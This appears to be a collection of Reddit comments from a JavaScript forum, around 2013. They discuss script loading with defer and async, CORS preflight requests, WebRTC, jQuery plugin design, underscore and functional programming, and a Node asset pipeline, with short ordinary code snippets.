The best way to learn how to code without the extra overhead of setting up bunch of stuf is Codecademy [1], no competition. I constantly reccomend this to people that want to get into coding. [1] http://www.codecademy.com/
Is there any other way to facilitate P2P connections between browsers?
[PeerJS](http://peerjs.com/). [Bonevalue](https://github.com/theninj4/bonevalue).
Is anyone starting to get the sense that all of these meta-meta-meta js development tools are starting to get a little out of control? I get the purpose of grunt for automating a dev workflow, but do we really need all of these additional things layered on top?
Watch the network tab in Chrome to help you debug what is being returned from XHRs.
not sure why this has to be a backbone plugin - or why you'd have to put in marionette if you want it stacked. It would do better as a stand-alone UI widget. If you want you could always have an adapter that makes it play nicely with backbone views and marionette. Just another case of needless dependencies
And the code in GitHub in https://github.com/wagerfield/parallax
I always read tutorials and knew little things about coding but could never get myself to build something interesting. I followed this post http://javascriptissexy.com/how-to-learn-javascript-properly/#Resources_For_This_Course and was able to build some pretty nice apps in pure js in no time. It gave me the structure I needed to grasp more complex concepts and start building something.
From my understanding, you only have to use a server for the first connection. The rest of the private keys can just be relayed through the existing connections, right? So the problem is only getting the first connection up...
I wrote a tool to help people experiment with JavaScript a little more quickly. http://prettydiff.com/learning-javascript.xhtml
Very smooth
What's a Generator?
Just before the closing body tag, specifically.
 var ref = document.referrer; if (!ref.match(/^https?:\/\/([^\/]+\.)?reddit\.com(\/|$)/i)) { alert("Came from reddit"); } The above works as expected for me, at least.
I don't think that either. I wouldn't say I know whole lot actually... Is there anywhere I can read about which challenges that I have to overcome?
NP, I definitely knew what you meant, I just wanted to make sure no one stumbled across it and thought "A hah! I'll put it in between the head and the body; they'll never see it coming!"
Very interesting :D Thanks! I'll have to read up. Very excited for ES6 
Hmm doesn't work in elinks.
If you have multiple script tags in the bottom of the body tag they will load in the order you have them listed. If you are using the defer attribute on the script tags then the order they load is not guaranteed AFAIK.
Been there, done that, tried to fit in 1K :) http://acko.net/files/dump/js1.5k.html I also have a thing on the physics of rollercoasters in my infinity article.
Well the site I'm working on now doesn't need old browser support (in fact, I'm sure it already breaks in other ways on older browsers). It's a big project that won't be done for a while and we don't have a lot of time to write extra code for older browser compatibility, and hey- we're good taking one for the team if it encourages users to upgrade their browsers :-) So because of our approach, I think I'm good using defer. I am concerned about [jcrady's point](http://www.reddit.com/r/javascript/comments/1l56ya/script_defer_vs_putting_script_at_bottom/cbvxkk2), though.
tested in Chrome's (F12) DevTools. Works for me.
This (&lt;script defer&gt;) was new to me so I looked it up and then tried it. Works in IE but not in FF or chrome. So I'll never use it.
This is just plain awesome. Thanks for sharing.
&lt;script defer&gt; has better browser support than I thought. I had assumed it was an IE-only thing for some reason. But according to this it's well supported across browsers, but on IE6/7/8/9 it won't guarantee execution order. http://caniuse.com/script-defer Nonetheless, what I tend to use is inserting a &lt;script&gt; element into the &lt;head&gt; dynamically, which also causes it to be asynchronous - but it will run as soon as the script has downloaded.
Async can be used for scripts that do not depend on each other. Putting JS in the header will cause it to be downloaded and executed before moving on to other stuff in your page like images. For sites where your JS is just adding sugar on top of HTML and CSS, the JS can be deferred. For some "apps" you may really want to load the JS before anything else (to get async calls moving, etc). This is something you should do profiling on: sometimes the actual performance differences are surprising or negligible.
You could fetch the data via ajax and modify it, then document.write the content out. I suspect the file:// wont work though. I would most certainly write a server proxy in this case.
I do e-learning. This is going to blow some minds.
It doesn't seem to be working in my Nexus 10 (latest android) but it may be something I disabled? I can touch and get it to move, but tilt sensors do nothing.
Here's a [great article](http://www.html5rocks.com/en/tutorials/speed/script-loading/) on script loading that will confirm this
This is really very nice. I imagine it was inspired by the subtle parallax effect in iOS 7. I wonder if this would work in Cordova/Phonegap.
it is not possible. at all. it is __explicitly__ disallowed even, due to security concerns. Therefor, i'm quite confident that your boss did not understand what her example site is actually doing. if your web browser was even remotely capable of doing that all websites would be able to install viruses on your machine, delete all your data, and it would never be safe to go anywhere on the internet ever again. There is a new-ish [file system api for html5](http://www.html5rocks.com/en/tutorials/file/filesystem/), but it also has restrictions that __explicitly__ disallow just about [everything on your requirements list](https://developer.mozilla.org/en-US/docs/Web/Guide/File_System_API/Introduction#restrictions). It also is [completely unsupported in IE](http://caniuse.com/#feat=filesystem). I suppose you can try to be clever and use a [chrome-frame](http://www.google.com/chromeframe) to trick IE into not being a bag of dicks, but that is no longer supported and will lead to future pain. Flash and Java might be able to do it, and probably ActiveX too, but the latter is definitely not recommended for a myriad of reasons. Another thing, is that you also really really really don't want to be fucking around with flat files on a web application. I don't know how many clients your boss thinks can be served using these limitations, but the answer is most probably 'no more than one user at a time'. you __will__ encounter write locks, overwrite each other's changes, and generally just lose data like a 10 year old loses their innocence in thailand. It is a bad idea on almost every level. seriously. Personally, I would use sqlite at the very very least, because even if it's single-threaded, it is clever enough to enqueue requests so you will have some limited form of write safety. That also includes having a server side app to do the query generation and csv exports for you. The other option, and the one I would recommend if it was my project, is to try do it with [couchdb](http://couchdb.apache.org/) and a [couchapp](https://npmjs.org/package/couchapp). CouchDB is a document database, and you can both store your html/js as documents in the database (to serve them), and use it as a clean REST-based data store to save the data from your forms. You can also implement the [straight CSV export](http://stackoverflow.com/questions/9942503/creating-csv-view-from-couchdb) to be served from there, dynamically updated as you write the data. Gives you a single server to maintain, and couch is just generally fun and easy to work with.
this is beautiful 
Movement works fine in Chrome but doesn't seem to work in Firefox for me. Do you know why? Edit: just tried on my home computer - same thing. Mouse control in Chrome but not Firefox.
Sweetness
You can set the async property to false. (function(a,b,c,d){ a="http://yourdomain.com/js/yourjs.js"; b=document;c='script';d=b.createElement(c);d.src=a;d.type='text/java'+c;d.async=false; a=b.getElementsByTagName(c)[0];a.parentNode.insertBefore(d,a); })(); There's a bug in this code where b.getElementsByTagName(c)[0]; is looking for the first script tag and inserting this new script above it, but if there's no existing script tag then it errors out.
Desktop Firefox 22. I mean, you can see it, but you can't control the camera with mouse movement like you can on Chrome. Just tried FF 23, same thing. 
What data transmit limits?
Well, the first big hurdle is the platform you have chosen. Peer-to-peer connections are impossible in browsers without WebRTC (or plugins), and even WebRTC needs a central server for brokering connections. So, simply put, a fully decentralized network is out of the question. What you can do is a distributed storage with a central server (your web server). One of the challenges would be designing a strategy for distributing the entire data among clients. Storing everything on every client is unnecessary and nonviable (because of very poor scaling), yet you have to have multiple copies of each resource. So, who stores what? In a decentralized network searching would be another challenge, but luckily in your case the server can maintain an index of the resources. Clients could simply ask the server who has the resource I'm looking for, and peers then share that data via WebRTC. There's also another problem with your chosen platform. You'd have access to the resources clients store only as long as they keep the webpage open. I imagine you'd have problems maintaining access to a majority of the data.
Without plugins, no.
You're right. Since the point of this was a completely decentralized network maybe I should just make a real application that is simple to install instead. I'm actually doing this as a sort of learning exercise. If it works and can be used for a real world usage, then great. But I'm mainly doing it to learn.
On my galaxy S4 it does not work too. I guess only Apple is supported.
Avoid using less.js in production. Just compile it to CSS. That way you're not reliant on JS to style your page. Also, your site totally barfs with javascript disabled. This wouldn't happen with CSS! I hope you have a license to use Proxima Nova as a web font.
this must be a wordpress problem in this case - thanks for trying guys. 
Alternatively just vote me up ;)
I like it but, I couldn't get it to work on the iPad, Android or Windows Phone. It's just animated, not interactive. On Chrome, fullscreen - it flickers and generally looks pretty bad. But the actual idea is nice... :/
You could write a small (recursive or iterative, the latter is a bit more difficult) anagram emitter that takes a function as sort / filter callback (could be helpful for games like scrabble or 4 pics one word). At the moment, I'm too busy to write one myself.
Trying to put the manatees out of business, you heartless bastard? 
Not working properly in Chrome on my Incredible 2. The wave images are spinning like airplane propellers
Looks cool. As others have said, the mouse tracking doesn't work in Firefox 23. Opera 12 works but is very laggy. Chrome 28 and IE 9 are smooth as silk. iPhone 5 and iPad 3 are a dream.
This is always a good way to challenge yourself. https://en.wikipedia.org/wiki/Maze_generation_algorithm You then have the ability to create a second part of your new maze algorithm, the solution algorithm. https://en.wikipedia.org/wiki/Maze_solving_algorithm Once you create this, you'll always have it for future reference, and you can also share the source with others so they can learn as well. Enjoy!
IPad mini here, smooth and nice
Interesting bug. I wonder how often it would actually hit, seeing as how it would have a script tag either referencing it or surrounding it... unless, I guess, you had it as a scriptlet or an embedded in a tag as part of an event handler?
I've downloaded the library and it's pretty cool. I am curious about one thing, however. Why use the demo with the diamonds as the only example and not include the website linked above? For those that would like to learn how to do something similar, including the smooth animation looping, it would be a great addition. Looking through the source of the site shows that a good part of it is hidden.
It's a dynamically inserted script tag for a system called tealium. The code is very similar to something the Facebook uses. It should have been looking for a head tag instead, I just haven't had time to fix it and it doesn't need to be for my website.
Oh, sure. I was just musing... Like I said, the bug only hits when you don't have a script tag on the whole page, and at the bare minimum, you'd usually have a script tag surrounding that code, or referencing it's page. Logically speaking, to have a more sound guarantee, it should look for a tag that can't not be on the page... head has to be there? Could you use document.childNodes?
I love that this sort of thing is becoming a trend. Having QA doing manual visual regression testing is a huge pain point for front-end refactors. I've been looking at [BBC's Wraith](https://github.com/BBC-News/wraith) myself, which seems to do similar things plus tests across different resolutions. It doesn't hook into any testing suite or give JSON output on the diff though, so I could see where the two could be combined into an automated multiresolution visual regression test.
It...doesn't look to be working in Chrome 29 on Linux
* You should see some marginal optimization by caching your for loop lengths. Example: for (x = 1, xL = perlin.length-1; x &lt; xL; x++) { This will remove an unnecessary property call on each iteration. As a note which I don't think comes up in your case, but it will change how a for loop behaves with adding/removing indexes inside the loop. * You could store a base tile for each type. Example: var Tiles = { water: { bgCol: 'rgba(140,180,230,1.0)' }, field: { bgCol: 'rgba(100,150,100,1.0)' }, forest: { bgCol: 'rgba(60,100,60,1.0)' }, mountain: { bgCol: 'rgba('+(perlin[x][y])+','+(perlin[x][y])+','+(perlin[x][y])+',1.0)' }, fallback: { bgCol: 'rgba('+(perlin[x][y])+',170,'+(perlin[x][y])+',1.0)' }, beach: { bgcol: 'rgba(255,0,0,1.0)' } }; This should not only speed up your tile generation, but allow you to reference the same tile for each type and lowering your memory needs substantially. If you need to modify specific tiles later, this won't work exactly. But in this case, there is no need to create a brand new tile for every single square. * Lastly, you probably don't need this in a game loop right now since it isn't changing between frames. But that was probably just added for later.
At the moment, Tessel looks more promising for my own use. Why? Two reasons: 1. The promise of many hardware components incl. an accelerometer, micro SD, RFID, audio, Bluetooth, temperature and humidity. Some of these look to be available in the OP project, but not the ones I'd personally be interested in using. 2. NPM. Node for god's sake. What's JavaScript without the power and flexibility of node? Being able to install any package in NPM and run it on a tiny machine? Amazing. This looks like I'll have to program it all myself which is less than desirable. I'd love to see as many of these open source kits as possible. I love seeing the creative uses people come up with, and with Javascript emerging as a viable option for embedded systems there are going to be many more creative ideas coming to life in the near future; however enabling features for the majority of users is the key here: you have to provide a familiar starting point, and you've gotta drive development - it needs module-ized hardware! I don't know how to make Bluetooth work through a serial port, but I definitely know how to interact with an API! Anyway, that's my two cents. Not sure if this is your project or not OP, but best of luck to you if it is - and please consider some of the points I've made above. :)
i'm curious does my experiment work on your device? http://xkeyscore.prototypeapp.com (it's very subtle, but should be noticable)
I can see it work in Chrome on Android 4.1 (the OP doesn't work.) At least I think it's working. It is a very subtle effect, but it does move with the phone. I'll have to check my tablet when I get home.
I like this pattern, but it needs a is-a relationship between observed objects to ensure a proper interfacing, right? http://jsfiddle.net/pRaQM/
This is bad practice IMO and should never be used. Try testing if the function exists by testing if the prototype exists and work from there. Or use modenizr for more HTML5 orientated functionality.
IE11 won't contain "MSIE" so this won't work: http://msdn.microsoft.com/en-us/library/ie/bg182625(v=vs.85).aspx
No offense, but this article would have been more useful in 2008. jQuery plugins shouldn't really be used as a way to structure your application architecture; there are far better ways of doing that.
that is totally it working. thanks :) (bonus: try in chrome on a macbook or something with a webcam)
$.blogPost should not be defined as a function with the intention of creating an object out of it (ie, using the new keyword) jQuery is broken down like so: $.staticMethods $.fn.instanceMethods it's perfectly ok to have an instance Method call a static Method, for example: $.fn.blogPost = function(options) { return this.each(function() { $.blogPost(this, option); }); } there are some exceptions to this rule, for example $.Deferred() and $.Callbacks(), however, 90% of them are just callable functions, not instantiations. also, the functions of the plug-in, base.init, base.clicker, etc... should not be defined in the constructor that way. They should be defined on the prototype. $.blogPost should just be var BlogPost, because both that being defined and $.fn.blogPost are in the same closure, you can call new BlogPost from $.fn.blogPost no problem, and keep it's use private to it at the same time. I would also add in a check to see if .blogPost had already been instantiated on node $.fn.blogPost = function(options) { return this.each(function() { if ($(this).data('blogPost')) { return; } $.blogPost(this, option); }); } of course you can expand that to be if (no instance) { create instance } else { call method } if you are doing an $element.blogPost('methodName'); paradigm (like jQueryUI has after instantiation) so yeah... sorry to burst your bubble
&gt;so yeah... sorry to burst your bubble I prefer to look at it as bubble expanding. Thanks for the feedback, I'll do some more research on this and make some changes. 
Thanks this is good information. I'll look in to them.
That seems like an extremely questionable architecture, in that to persist any data you have to run a server that subscribes to the message channel through their service. What happens if your server goes down temporarily and misses some messages? In a traditional application, the client can detect when that happens and retry or provide the user with an error message. Under the proposed scheme, a client would have no way of knowing that their changes have been received, because they were successfully published to the message channel, but nothing was listening to record them. It seems like it would be *very* easy for things to get out of sync. 
Hmm same version, not working here. Odd :S
What does your console say?
This isn't really an "observer pattern". It's close, but it lacks a Subject or "Observable" and doesn't need that ObserverList, as the Observable (or Subject) would curate that.
Two great (short) videos by Justin Meyer explaining the Observer Pattern a bit better. Part 1: http://www.youtube.com/watch?v=NZi5Ru4KVug Part 2: http://www.youtube.com/watch?v=yFxDY5SQQp4
 Uncaught TypeError: Cannot read property 'labels' of undefined from brick.js on line 2.
I really don't understand the point of this... add 5$ and you could use an ARM soc with an MMU, a few megs of ram and use Linux to run nodejs or something if you really want to use javascript. It really doesn't make sense to me, it's like booting up an old C64 and hack on that ( except that has more RAM)...
Why can't I scroll the page (no momentum) on my phone? It lags on initial drag and only scrolls for as long as my finger is touching the screen. The page stops scrolling as soon as my finger leaves the screen.
Depending on your specific MeshNet you don't need the javascript capability. Instead use any OpenWRT capable router: OpenWRT is a Linux variant with all the standard Linux wireless network apis. For example PirateBox runs on cheapass OpenWRT capable (mobile) routers: it uses the standard ipconfig / iwconfig stuff, ssh and all that, even has Python support. OpenWRT should in principle be able to run javascript although the interpreters are a bit heavy on system resource use, so most cheap routers for example cannot run Node.js.
Seems to work in Chrome on Android. Firefox is a no-go, but I think their support is kind of meh right now. The camera access seemed to do nothing.
Here's my follow up: http://blog.trevnorris.com/2013/08/callbacks-what-i-said-was.html
This isn't a popular opinion here, but IE6 had something similar to this and I loved it back then! It was called HTC, it was even submitted to the W3C: http://www.w3.org/TR/NOTE-HTMLComponents. IE6 was ahead of its time in many ways...
Good read! Tell Jake someone on the internet said hi.
I love you. Seriously. Thank you. Now figure out how to EMP W3schools servers off the internet and the dark times will be behind us. 
Ha! Awesome! As much as PHP grinds my gears, it's always had the best docs by far because of this exact feature. Glad to see it in other domains now, too.
Why use phantom instead of node?
 mdn.io/array -&gt; https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Array wooooooo
&gt; Download and install your build tools, create make files, do your compilation and linking steps. Oops, syntax error! Now go back and do this all again once you fix it. Even as a seasoned embedded developer I HATE going through this process a bajillion times a day. If I have to build another maven or ant project... I think I'm going to snap.
From what I can tell, the problem is twofold; first, you're using Visual Basic. Second, you're posting a Visual Basic question in a JavaScript subreddit.
Well, these lines are all wrong: SB5.Append("&lt;script type=""text/javascript""&gt;" &amp; _ " document.getElementById(""TestDiv"").innerHTML=""hi""; " &amp; _ Should be something like this: SB5.Append("&lt;script type='text/javascript'&gt;" &amp; _ "document.getElementById('TestDiv').innerHTML='hi'; " &amp; _ I'm not sure how you're combining VB and javascript, but the quotations thing can be tricky.
Don't want to be negative about this , but javascript is not made for microcontrollers. Best of luck to OP. 
Yeah totally, got any board and/or NPM module recommendations?
for what it's worth, i really only read about half of this before i got bored. it took too long to get to the point. however, i'm sort of tired of devs getting lumped into one language. i write javascript for a living, but i also write php, java, html/css, and some ruby. the problem isn't that "javascript" developers don't know about types, it's that there is more software development happening than then are competent/experienced programmers. this means that some incompetent and/or rookie developers are going to get tasked with overly complex projects and they might not know what NaN is.
More reason to use Grunt Source, one Grunt project to rule them all
I generally agree, it's good to maintain a good balance of tooling. Though I don't think Grunt Source is 3 metas, maybe just 1 meta :) Because it's quite simple, just move your `Gruntfile.js` and `package.json` to a different directory and then point Grunt Source there. I built it because I make lot's of websites with Jade/Stylus/CoffeeScript, lots of CoffeeScript/Minified JavaScript libraries, and I'm even using it for my Node projects to add templating my `README.md`s and more. Thats 3 Grunt projects that all my other projects point to. At the end of the day, tools are there to improve your workflow, so if the tool doesn't help you, no point in using it.
cors makes me puke
Honestly? Your absolute best option is to use a small cookie library. It hides the ugliest of the code from you and gives you something that makes sense. You don't need a massive library like jQuery, instead I'd recommend something fairly simple, like [this](https://code.google.com/p/cookie-js/) perhaps. There are others I could recommend as well. With that said, I can address some of the other issues in your code. &lt;!--AGE VERIFY --&gt; &lt;div id="age_verify"&gt; &lt;div id="black_cover"&gt;&lt;/div&gt; &lt;div id="ageverify_box"&gt; Are you 18 years of age or older? &lt;div id="agebtn_contain"&gt; &lt;!-- These two `div`s would be better as buttons. Makes it MUCH more obvious to everyone that they should be clicked on. Even screen readers will handle them differently. (The alternative is to use CSS to at least make sure the cursor changes.) --&gt; &lt;div id="over21"&gt;&lt;a href="#"&gt;Yes, I am 18 or older&lt;/a&gt;&lt;/div&gt; &lt;div id="under21"&gt;&lt;a href="http://disney.com/"&gt;No, I am under 18&lt;/a&gt;&lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;script type="text/javascript"&gt; // UGG.. loose the `&lt;!--` and ditch whatever resource you learned // it from. It hasn't been needed since IE Version 2. &lt;!-- var state; window.onload=function() { obj=document.getElementById('age_verify'); state=(state==null)?'show':state; // No CSS, no reason to use className obj.className=state; // The use of `onclick` works, but using a more modern approach // is best. // This reference will explain things far better than I can: // http://stackoverflow.com/questions/6348494/addeventlistener-vs-onclick document.getElementById('over21').onclick=function() { // No point in setting class name if you arent' using CSS obj.className=(obj.className=='show')?'hide':'show'; state=obj.className; obj.style.display = 'none'; setcookie(); return false; } } // And loose this as well for the same reason. --&gt; &lt;/script&gt; 
An OPTIONS request will only proceed the CORS request if the request type is not one of POST/GET and/or custom request headers are set. There are a few other variables to this - covered well at the MDN CORS article page. 
&gt; "if POST is used to send request data with a Content-Type other than application/x-www-form-urlencoded, multipart/form-data, or text/plain" So my CORS RESTful JSON API server will send a preflight OPTIONS request on **everything** except GET
Not really, that is still an MCU without an MMU, so it can't use a standard linux kernel (there are variants for this), But something like this could run a full, standard GNU/Linux : https://www.olimex.com/Products/OLinuXino/iMX233/iMX233-OLinuXino-MINI-WiFi/open-source-hardware
now I love you too
Inline scripts which are appended to the DOM will not be evaluated/executed. You could use: wb.document.parentwindow.execscript " document.getElementById(""TestDiv"").innerHTML=""hi""; " Better: put some JS functions in the page and call them from VB (but only if you absolutely must use VB, JS is usually the way to go).
I think it's simpler to get started. I will get one of these for my 5 yo to mess around with.
I never actually did it with a miniboard but it is safe to assume anything with a decent Linux version that can run Node.js and connect to an Arduino will work. When I messed with it I used this popular module: https://npmjs.org/package/firmata but here are a few more: https://npmjs.org/search?q=arduino
Question: do you now if there is a javascript interpreter that runs well on OpenWRT flashed mobile router? Something like a TP-Link MR 3020?
"pure JavaScript" http://imgur.com/PGcgJDU riiiiiight.
That partial support in IE8 has forced me to use JSONP, which is quite uncomfortable as it allows only GET requests.
This thing is a monster and not a low power compared to arduino. Arduino C isn't really that much more difficult(if at all) than javascript. I would just go with Arduino Due if I needed this much power, or perhaps Teensy 3.0 :)
I recently needed to do a cross-domain POST (really one domain but HTTP to HTTPS) supporting back to at least IE7 and ended up going with [easyXDM](https://github.com/oyvindkinsey/easyXDM#readme) to handle cases when CORS wasn't available. It has five "transports" it can use to get your message posted cross-domain. Worked like a charm.
it is entirely possible...especially in a windoze only environment...you don't think they built the proprietary armies just so they wouldn't talk to each other? It is explicitly disallowed due to security concerns, which are non-existent in this case because we're not talking about internet, we talking about intranet. The plug-ins route is one way to approach it, but I think the only one really necessary is Active X. couch opinion is solid
Ha, nice! On the subject of documentation, everyone should also check out [devdocs.io](http://devdocs.io/) - it's now my everyday reference for everything web. The UI is incredibly considered.
Comments on usefulness/code quality are highly appreciated :P
I built a mediator called Nerve here: https://github.com/rhysbrettbowen/Nerve - it allows wildcards when listening for messages. Originally build for Google Closure but it was updated to work with underscore.js as a dependency.
sure, that can work, but this has wifi, and much lower power than the PI (but less powerful)
Three pieces of critique: 1. Are JSON objects generally ordered in javascript? The JSON spec claims the the key,value pairs are unordered. You cannot, for example, make sure to load jquery before loading a library that requires it. I would have to use some manual JS files outside your pipeline to make my order work with jquery and dustjs 2. Generally, a good asset pipeline will compile (css should support extensible middleware for SASS and Stylus, js should support extensible middleware for coffee), minify, and merge the js/css into a single file of each time 3. That file merging should provide a naming schema that takes maximum advantage of the client's cacheing. Unless a file changes, the merged-filename should be unchanged. The moment your file is altered and you restart, the merged-filename should be different. If you had all three of those things cleaned up, I'd use your pipeline in every project. edit: Addition item #4. Callback hooks, everywhere. They take 5 minutes to add, a little longer to document. You will never predict every way every developer wants to use your library. I can't count how many times I've had to switch libraries or refactor someone's code because I wanted to inject a little custom behavior and the project didn't have an onInit() hook or something-or-other.
apparently his friend was "messing around with SEO": https://twitter.com/chad_d_johnson/status/371461541528219648
when you use functional programming one of the things you do a lot is to partially apply things. For this to be useful though the order of arguments is important. So if _.map took the mapping function first I could create a "getNames" like this: var getName = function(obj) {return obj.name;}; var getNames = _.partial(_.map, getName); but because _.map takes the actual list first you have to do some other trickery. NOTE: I created https://github.com/rhysbrettbowen/Underscore.Extras which gives you a _.flip that will flip the first two arguments so you could create a "functional map" like this: _.mixin({fmap: _.flip(_.map)}) so you could then do the above swapping _.map for _.fmap
Much appreciated! 1. Regarding the JSON ordering, i have not yet encountered a problem with the fact that JSON is unordered by spec, my script seems to preserve the order every time, but i have already considered including some kind of dependency system and i will work on implementing this first. 2. Compilation of assets is a definite Todo from start. I will add a Todo list to the readme so that people know what to expect and contribute. 3. Also a TODO, once the dependency system and asset compilation are implemented ,either manually or by means of some other module, although i'd preffer to keep this as dependency free as possible, i will go on and implement this feature. 4. Callback hooks are obviously a must, i should refactor my code and make them usable in this case ( any recommendations? ). Again, thanks for the detailed critique, and feel free to contribute if you feel like it. EDIT: I'll most likely implement tests first and give this more of a BDD approach 
Not sure what to make of these posts after you deleted my helpful comments about the revealing module pattern..
it would be more interesting if you used deferreds to control a pool of 5 exec method calls as that is your limit.
Pretty new and haven't had the chance to use it much in the wild yet. I got frustrated integrating with YouTube, Twitter, and Facebook for analytics tracking purposes and decided I didn't want to have to do it from scratch again. Also, I wanted a single API to deal with. There are examples here https://github.com/freshcodes/antycs/tree/master/examples
By the way... The Twitter Web Intents library absolutely blows away the YouTube and Facebook offerings. So much easier to integrate with.
Doing a full draw of a single chunk only took an hour or 2, the difficulty was chaining multiple chunks together and refactoring it multiple times to get better performance. I'm not sure what I'd do with it, I find writing the engines to be more fun than using them :p
Well it depends how you interpret "pure" I suppose. Pure as in "no libraries of any kind", I agree. Pure as in "it doesn't use any browser plugins or other shenanigans other than written javascript", not so much
Awesome! My recommendation about callback hooks is to not panic. Everyone I mention it to says "I should refactor my code to support it"... But you don't have to. Just add an eventEmitter (or your favorite event pattern or library) to your object and emit every event that makes any sense whatsoever. Each emit is just a one-liner, so it's not a big deal if some rarely/never get used. You can do all this in your current plans. That is, when you start an analysis side to the script imports, emit a "script-import" event per script... suddenly, you have given developers a hook to add language compilation. When you're about to write the scripts out, emit a "script" event that includes the tag (in case someone wants to manipulate that tag). And so on, and so forth. Gonna favorite your project. When I have time, I might make a pull request or two of changes (if you don't mind). I've been wanting a good asset pipeline in node.
Ah! Now i get what you mean, yes it sounds scary at first but now that you've explained it's fairly simple. Thanks! No,I don't mind at all. I'm currently in progress of creating the dependency system and i think i got it working fairly good. I'll push it up soon.
Thats what i thought, it's node, so it shouldn't break things like this. But doesn't matter now, already implemented the dependency managment system :D
I would trust Fogus.
I absolutely intend to: 1. Work very hard at learning every strange and wonderful concept presented in this talk. 2. Push to get scoreunder into use at my workplace instead of underscore. I've tried to learn clojure in the past, and one of the things I did was do the exercises at 4clojure.com. The amazing thing about that experience is that you get to solve a problem, and then peek at expert level code, code that is much shorter, and uses far fewer tokens than my own code. It always amazed me how functions that took me 4 lines and 20 odd tokens could be done in one line with 4-6 tokens. I always felt that there was something I was missing conceptually that kept me from writing such code. And apparently this talk presents some of it. I'm a functional-imperative programmer. I program the "functionalish" way that people program in Python, Ruby, Perl or JavaScript. I use map, reduce and filter. I know how to use closures. Currying to me has always been one of those "strange and probably useless" concepts that Paul Graham described when explaining the blub paradox. When I tried to write good Clojure code, problem solutions that I thought were close to ideal turned out to be large, clunky and amateurish. So I'm very happy that I've run into this talk, thank you chocolategirl for posting it. 
Might I recommend the following libraries that are in spirit of the talk: http://osteele.com/sources/javascript/functional/ https://github.com/loop-recur/FunctionalJS (beefed up version of the above) https://github.com/culljs/culljs
&gt;For this to be useful though the order of arguments is important. [C++ has a solution to this](http://en.cppreference.com/w/cpp/utility/functional/bind), how does JavaScript not?
I've reworked the example in the article to give a better idea of how the observer pattern works; hopefully that helps a little!
There is a "bind" in JavaScript: https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Function/bind but it will also bind the context of the function. I don't think this has to be in the JavaScript standard library - it's extremely simple to create using closures (something which has only been added to c++ in the latest version). Also I don't believe there has been a big push in using JavaScript functionally until recently so it would not have been proposed as a standard yet (I'm sure this will come up in future discussions).
underscore isn't exactly "doing it wrong", it's more that it "could have done better" with it's function signatures. You can still use underscore, just you'll have to jump through an extra hoop when doing higher order functions through partial application or currying
That title is so obnoxious. 
Fogus maintains underscore-contrib, which provides the rest of the stuff that the OP argues underscore should have provided out of the box. http://blog.fogus.me/2013/04/25/announcing-underscore-contrib/
[lodash](http://lodash.com/) Has `_.partialRight` which fixes his main problem. Completely compatible with underscore, and faster to boot.
This seems similar to [grunt-usemin](https://github.com/yeoman/grunt-usemin).
Also [Fantasy Land](https://github.com/puffnfresh/fantasy-land).
JavaScript's `bind` does not let you bind the second argument without also binding the first, like C++'s apparently does. You could in theory absolutely define a `bind` function in JavaScript that does what C++'s does. However, I assume that C++'s is implemented using templating and so it will be done at compile time. The only ways I can think to handle it in JavaScript are going to be pretty complicated and probably inefficient. You could get around this by having it implemented as native code in the standard library, but I'm not a fan of standardizing a bunch of globals like `_1`, `_2`, etc., which you would need.
If I'm not mistaken, it seems like you have implemented a custom event emitter, it's much easier to util.inherit from the [events.EventEmitter](http://nodejs.org/api/events.html#events_class_events_eventemitter) in node core, like: var util = require('util'), EventEmitter = require('events').EventEmitter; ... util.inherits(AssetPipe, EventEmitter); Then all you have to do is this.emit('eventName', anyOtherStuff); === Also, I think it's normally considered better practice to define class methods on the prototype of your object rather than as this.whatever ie: function AssetPipe(config, basePath) { return this; } AssetPipe.prototype.parse = function (html) { ... vs function AssetPipe(config, basePath) { this.parse = function (html) { ... 
As a person who is not the framework Underscore.js, I don't find it this way at all. I imagine if I was Underscore.js I might be a little upset but otherwise unperturbed at this claim of my imperfection. 
C++ can bind even the last one only
The first one, Oliver Steele's functional library, is wonderful, especially the with the string lambdas. I highly recommend checking it out.
Unfortunately, obnoxious/catchy/witty titles seem to be necessary for talk proposals to be considered. Many Call for Speaker forms even explicitly mention this.
Just for shortness sake :D
Hi, You are right. I gave it some thought and even tried to sketch out a [prototype](http://jsbin.com/AqAKEJO/4/edit). Here's the basic design: * Root contains `_val` property (either true or false, defines the status of the whole set. this is used for complex ops (difference etc.)) * Actual set members are defined as accessors that read `_val` * The ops would yield chains operating on the aforementioned concepts. Unfortunately this is where the scheme failed. It is possible to construct A -&gt; B -&gt; C but it looks like Object.create doesn't allow object references to be mixed (probably for a good reason). I guess the accessors could be recreated when inheriting but that would be missing most of the point. Anyway, thanks for the help. :)
ITT: python is a better functional language than erlang.
Coffeescript is not javascript at all. Where is function hoisting?
The title is a bit misleading. This not a J2ME-compliant bytecode interpreter like I expected, but a Java .jar to .js cross-compiler, and then the J2ME standard library rewritten in Javascript (well, parts of it right now). Since the compilation costs are paid upfront and majority of the "low level" code is handwritten JS, this probably won't pay a high of a perf cost as I originally assumed. I wonder how it compares to an asm.js-based interpreter, since it's intended for FirefoxOS.
Not sure if you're allowed to call a standard language feature a "pattern". Last I checked no one calls the use of classes in an OO language the "class pattern"
There's a few reasons to use them, I'm surprised the author doesn't recognize them... For one, they can cut down on a ton of code at times. A completely fabricated example, but very representative of possible real-world usage: var newValue = 1; obj.prop = newValue; obj.collection.forEach(function(item){ item.prop = newValue; }); obj.evt.emit('prop:change', newValue); // some code later...this quickly becomes repetitious var newValue = 2; obj.prop = newValue; obj.collection.forEach(function(item){ item.prop = newValue; }); obj.evt.emit('prop:change', newValue); Versus: var newValue = 1; obj.setProp(newValue); // updates self, collection, &amp; emits event // some code later... var newValue = 2; obj.setProp(newValue); Of course it could be argued that you could simply just use the event to handle everything, but really, it's "6 one way, a half-dozen the other", and I'd prefer not to rely on asynchronous events for updating object properties -- that could lead to some serious race conditions. Instead, fire the asynchronous events from the synchronous setter, so at least you can guarantee that your object will be updated by the time the next statement is interpreted. The other use-case that comes to mind is for lazy-evaluation... function getDependency() { if (!(this.dependency instanceof SomeDependency)) { this.dependency = new SomeDependency(); } return this.dependency; } This is extremely useful for when said dependency is a) expensive to create, and b) may not be used at all. It's silly to create expensive objects if you never use them, and creating them on-the-spot before use violates DRY if you require access in &gt;1 location.
